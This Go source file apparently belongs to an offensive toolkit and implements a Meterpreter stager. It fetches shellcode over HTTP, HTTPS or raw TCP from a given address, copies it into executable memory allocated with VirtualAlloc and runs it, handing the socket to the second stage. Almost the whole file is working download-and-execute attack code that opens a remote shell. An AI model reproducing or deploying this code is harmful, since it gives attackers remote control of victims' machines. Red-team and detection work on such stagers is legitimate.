//TODO: Rewrite this
package core

import (
	"encoding/binary"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

//Function launches a meterpreter connection, takes 2 parameters connection type (HTTP/HTTPS/TCP) and Address (127.0.0.1:4444), function returns a string for error handling.

func Meterpreter(ConType string, Address string) bool {
	if ConType == "http" || ConType == "HTTP" || ConType == "https" || ConType == "HTTPS" {
		Checksum := CalculateChecksum(12)
		var FullURL string
		if ConType == "http" || ConType == "HTTP" {
			FullURL = "http://" + Address + "/" + Checksum
		} else if ConType == "https" || ConType == "HTTPS" {
			FullURL = "https://" + Address + "/" + Checksum
		}
		Resp, Err := http.Get(FullURL)
		if Err != nil {
			return false
		}
		defer Resp.Body.Close()
		Shellcode, _ := ioutil.ReadAll(Resp.Body)
		SyscallExecute(Shellcode)
		return true
	} else if ConType == "tcp" || ConType == "TCP" {
		var WsaData syscall.WSAData
		_ = syscall.WSAStartup(uint32(0x202), &WsaData)
		Socket, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
		AddressArray := strings.Split(Address, ":")
		IpArrayStr := strings.Split(AddressArray[0], ".")
		var IpArrayInt [4]int
		for i := 0; i < 4; i++ {
			IpArrayInt[i], _ = strconv.Atoi(IpArrayStr[i])
		}
		PortInt, _ := strconv.Atoi(AddressArray[1])
		SocketAddr := syscall.SockaddrInet4{Port: PortInt, Addr: [4]byte{byte(IpArrayInt[0]), byte(IpArrayInt[1]), byte(IpArrayInt[2]), byte(IpArrayInt[3])}}
		_ = syscall.Connect(Socket, &SocketAddr)
		var SecondStageLengt [4]byte
		WsaBuffer := syscall.WSABuf{Len: uint32(4), Buf: &SecondStageLengt[0]}
		Flags := uint32(0)
		DataReceived := uint32(0)
		_ = syscall.WSARecv(Socket, &WsaBuffer, 1, &DataReceived, &Flags, nil, nil)
		SecondStageLengthInt := binary.LittleEndian.Uint32(SecondStageLengt[:])
		if SecondStageLengthInt < 100 {
			return false
		}
		SecondStageBuffer := make([]byte, SecondStageLengthInt)
		var Shellcode []byte
		WsaBuffer = syscall.WSABuf{Len: SecondStageLengthInt, Buf: &SecondStageBuffer[0]}
		Flags = uint32(0)
		DataReceived = uint32(0)
		TotalDataReceived := uint32(0)
		for TotalDataReceived < SecondStageLengthInt {
			_ = syscall.WSARecv(Socket, &WsaBuffer, 1, &DataReceived, &Flags, nil, nil)
			for i := 0; i < int(DataReceived); i++ {
				Shellcode = append(Shellcode, SecondStageBuffer[i])
			}
			TotalDataReceived += DataReceived
		}
		Addr, _, _ := procVirtualAlloc.Call(0, uintptr(SecondStageLengthInt+5), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
		AddrPtr := (*[990000]byte)(unsafe.Pointer(Addr))
		SocketPtr := (uintptr)(unsafe.Pointer(Socket))
		AddrPtr[0] = 0xBF
		AddrPtr[1] = byte(SocketPtr)
		AddrPtr[2] = 0x00
		AddrPtr[3] = 0x00
		AddrPtr[4] = 0x00
		for i, j := range Shellcode {
			AddrPtr[i+5] = j
		}
		syscall.Syscall(Addr, 0, 0, 0, 0)
		return true
	} else {
		return false
	}
}
